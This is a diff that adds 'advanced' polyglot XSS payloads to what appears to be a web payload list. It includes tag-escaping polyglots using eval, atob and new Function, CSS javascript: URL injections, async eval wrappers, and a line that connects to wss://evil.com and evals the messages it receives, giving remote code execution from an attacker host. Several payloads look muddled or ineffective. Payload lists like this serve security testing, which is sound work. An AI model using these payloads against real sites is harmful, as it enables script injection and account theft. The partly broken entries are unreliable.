@@ -513,3 +513,27 @@ new Proxy({}, {
   ownKeys: () => alert(13)
 });
 </script> 
+
+# Advanced Polyglot Payloads
+javascript:"/*--></title></style></template></noembed></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+(()=>{
+  eval(atob('YWxlcnQoMSk='));
+  new Function('alert(1)')();
+  document.body.innerHTML = `<img src=x onerror=alert(1)>`;
+})()//'>
+
+# Advanced CSS Injection Polyglot
+<style>
+@import 'javascript:alert(1)';
+background-image: url('javascript:alert(1)');
+list-style-image: url('javascript:alert(1)');
+</style>
+
+# Advanced WebSocket + EventSource Polyglot
+new WebSocket('wss://evil.com').onmessage = e => eval(e.data);
+new EventSource('data:,alert(1)');
+
+# Advanced Async/Await Polyglot
+(async () => {
+  await Promise.resolve(alert(1));
+  await eval('alert(1)');
+})();
